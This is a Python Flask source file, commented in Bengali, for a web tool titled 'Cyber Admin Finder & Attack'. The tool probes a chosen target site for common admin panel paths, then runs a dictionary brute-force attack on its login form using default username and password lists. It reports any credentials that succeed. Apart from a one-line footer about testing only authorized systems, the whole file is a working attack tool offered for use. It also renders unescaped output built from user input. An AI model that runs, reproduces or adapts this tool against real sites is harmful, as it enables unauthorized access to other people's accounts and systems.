from flask import Flask, render_template_string, request
import requests
from concurrent.futures import ThreadPoolExecutor
import itertools
import re

app = Flask(__name__)

# ==================== HTML টেমপ্লেট (সুন্দর ডিজাইন) ====================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyber Admin Finder & Attack</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        body {
            background: #0b0f1a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            width: 100%;
            background: #141b2b;
            border-radius: 30px;
            padding: 35px 30px;
            box-shadow: 0 20px 60px rgba(0, 255, 200, 0.08), 0 0 0 1px #1e2a3f;
            backdrop-filter: blur(4px);
            transition: 0.3s;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 2.4rem;
            font-weight: 700;
            background: linear-gradient(135deg, #00f5d4, #0affb0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 1px;
            text-shadow: 0 0 30px #00f5d433;
        }
        .header .sub {
            color: #6a7f9e;
            font-size: 0.95rem;
            margin-top: 6px;
            letter-spacing: 2px;
        }
        .header .sub span {
            color: #00f5d4;
            font-weight: 600;
        }
        .card {
            background: #101826;
            border-radius: 18px;
            padding: 22px 25px;
            margin-bottom: 25px;
            border: 1px solid #1f2d44;
            transition: 0.25s;
        }
        .card:hover {
            border-color: #00f5d466;
            box-shadow: 0 0 25px #00f5d411;
        }
        .card h3 {
            color: #b0d4ff;
            font-weight: 500;
            font-size: 1.2rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .card h3 i {
            font-style: normal;
            font-size: 1.5rem;
        }
        .form-group {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
        }
        .form-group input {
            flex: 1 1 200px;
            padding: 12px 16px;
            background: #0b111e;
            border: 1px solid #25344f;
            border-radius: 12px;
            color: #d0e4ff;
            font-size: 0.95rem;
            outline: none;
            transition: 0.2s;
        }
        .form-group input:focus {
            border-color: #00f5d4;
            box-shadow: 0 0 0 3px #00f5d422;
        }
        .form-group input::placeholder {
            color: #4d607e;
        }
        .form-group button {
            padding: 12px 28px;
            background: linear-gradient(135deg, #00c9a7, #00e699);
            border: none;
            border-radius: 12px;
            font-weight: 600;
            font-size: 1rem;
            color: #0b0f1a;
            cursor: pointer;
            transition: 0.25s;
            box-shadow: 0 4px 15px #00f5d433;
            white-space: nowrap;
        }
        .form-group button:hover {
            transform: scale(1.02);
            box-shadow: 0 6px 25px #00f5d466;
        }
        .form-group button:active {
            transform: scale(0.97);
        }
        .result-box {
            background: #0a101c;
            border-radius: 16px;
            padding: 18px 22px;
            margin-top: 15px;
            border-left: 4px solid #00f5d4;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            font-size: 0.92rem;
            color: #b8d6ff;
            max-height: 400px;
            overflow-y: auto;
            line-height: 1.7;
            word-break: break-word;
        }
        .result-box .success {
            color: #6affb0;
        }
        .result-box .error {
            color: #ff7a8a;
        }
        .result-box .info {
            color: #7fc9ff;
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            color: #3e5470;
            font-size: 0.9rem;
            border-top: 1px solid #1a263b;
            padding-top: 20px;
        }
        .footer span {
            color: #00f5d4;
            font-weight: 500;
        }
        .badge {
            display: inline-block;
            background: #00f5d422;
            padding: 4px 14px;
            border-radius: 30px;
            color: #00f5d4;
            font-size: 0.75rem;
            letter-spacing: 1px;
            border: 1px solid #00f5d433;
        }
        ::-webkit-scrollbar {
            width: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #0b111e;
        }
        ::-webkit-scrollbar-thumb {
            background: #1f2d44;
            border-radius: 20px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #00f5d466;
        }
        @media (max-width: 600px) {
            .container { padding: 20px 15px; }
            .header h1 { font-size: 1.8rem; }
            .form-group input { flex: 1 1 100%; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🛡️ Cyber Admin Finder & Attack</h1>
        <div class="sub">Developer <span>Arif</span> • v2.0 • <span class="badge">#EthicalTest</span></div>
    </div>

    <!-- কার্ড ১: অ্যাডমিন প্যানেল ফাইন্ডার -->
    <div class="card">
        <h3><i>🔍</i> ১. অ্যাডমিন প্যানেল খুঁজুন</h3>
        <form method="POST" action="/find_admin">
            <div class="form-group">
                <input type="text" name="url" placeholder="http://target.com" required>
                <button type="submit">🔎 Scan</button>
            </div>
        </form>
    </div>

    <!-- কার্ড ২: ব্রুটফোর্স অ্যাটাক -->
    <div class="card">
        <h3><i>⚡</i> ২. লগইন ক্র্যাক করুন (Brute‑Force)</h3>
        <form method="POST" action="/bruteforce">
            <div class="form-group">
                <input type="text" name="login_url" placeholder="http://target.com/admin/login" required>
                <input type="text" name="username_field" placeholder="username field" value="username">
                <input type="text" name="password_field" placeholder="password field" value="password">
                <button type="submit">🚀 Attack</button>
            </div>
        </form>
    </div>

    <!-- রেজাল্ট দেখানোর জায়গা -->
    {% if result %}
    <div class="card" style="border-color: #00f5d488;">
        <h3><i>📌</i> রেজাল্ট</h3>
        <div class="result-box">{{ result|safe }}</div>
    </div>
    {% endif %}

    <div class="footer">
        <span>⚠️</span> শুধুমাত্র অনুমোদিত সিস্টেমে টেস্ট করুন  •  <span>Developer Arif</span>  •  <span>🔐</span>
    </div>
</div>
</body>
</html>
"""

# ==================== ব্যাকএন্ড লজিক (এরর-প্রুফ) ====================

def find_admin_panels(base_url):
    """কমন পাথ চেক করে অ্যাডমিন প্যানেল খোঁজে (এরর হ্যান্ডেল সহ)"""
    paths = [
        '/admin', '/admin.php', '/admin/login', '/login', '/wp-admin',
        '/administrator', '/panel', '/dashboard', '/admincp', '/cpanel',
        '/user', '/auth', '/backend', '/admin_area', '/controlpanel',
        '/manage', '/siteadmin', '/master', '/admin/login.php',
        '/login.php', '/admin/index.php'
    ]
    found = []
    if not base_url.startswith(('http://', 'https://')):
        base_url = 'http://' + base_url

    for path in paths:
        try:
            test_url = base_url.rstrip('/') + path
            r = requests.get(test_url, timeout=2.5, allow_redirects=False)
            if r.status_code in [200, 301, 302, 307, 401, 403]:
                found.append(f"✅ {test_url}  →  Status: {r.status_code}")
        except requests.exceptions.Timeout:
            found.append(f"⏱️ {path} → Timeout")
        except requests.exceptions.ConnectionError:
            found.append(f"⚠️ {path} → Connection error")
        except Exception:
            found.append(f"⚠️ {path} → Unknown error")
    return found if found else ["❌ কোনো অ্যাডমিন প্যানেল পাওয়া যায়নি।"]

def brute_force_login(login_url, username_field, password_field):
    """ডিকশনারি অ্যাটাক চালায় (এরর হ্যান্ডেল সহ)"""
    if not login_url.startswith(('http://', 'https://')):
        login_url = 'http://' + login_url

    usernames = ['admin', 'root', 'user', 'test', 'guest', 'manager', 'administrator', 'demo']
    passwords = ['admin', '123456', 'password', '12345', 'root', 'qwerty', 'abc123', '111111', 'letmein']

    found = []
    total_attempts = len(usernames) * len(passwords)
    attempt = 0

    for user, passw in itertools.product(usernames, passwords):
        attempt += 1
        try:
            data = {username_field: user, password_field: passw}
            r = requests.post(login_url, data=data, timeout=3, allow_redirects=False)
            # লগইন সফল অনুমান – 302 রিডাইরেক্ট অথবা পেজে 'dashboard' 'welcome' শব্দ থাকলে
            if r.status_code == 302:
                found.append(f"🎯 সফল! ইউজার: {user}  |  পাস: {passw}")
                break
            elif r.status_code == 200 and any(word in r.text.lower() for word in ['dashboard', 'welcome', 'panel']):
                found.append(f"🎯 সফল! ইউজার: {user}  |  পাস: {passw}")
                break
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.ConnectionError:
            return ["❌ কানেকশন এরর – URL ঠিক আছে কিনা চেক করো।"]
        except Exception:
            continue
    if not found:
        found = ["❌ কোনো ক্রেডেনশিয়াল কাজ করেনি।"]
    return found

# ==================== রাউট ====================
@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML_TEMPLATE, result=None)

@app.route('/find_admin', methods=['POST'])
def find_admin():
    url = request.form.get('url', '').strip()
    if not url:
        return render_template_string(HTML_TEMPLATE, result="⚠️ দয়া করে একটি URL দিন।")
    res = find_admin_panels(url)
    output = "\n".join(res)
    return render_template_string(HTML_TEMPLATE, result=output)

@app.route('/bruteforce', methods=['POST'])
def bruteforce():
    login_url = request.form.get('login_url', '').strip()
    user_field = request.form.get('username_field', 'username').strip()
    pass_field = request.form.get('password_field', 'password').strip()
    if not login_url:
        return render_template_string(HTML_TEMPLATE, result="⚠️ দয়া করে লগইন URL দিন।")
    res = brute_force_login(login_url, user_field, pass_field)
    output = "\n".join(res)
    return render_template_string(HTML_TEMPLATE, result=output)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)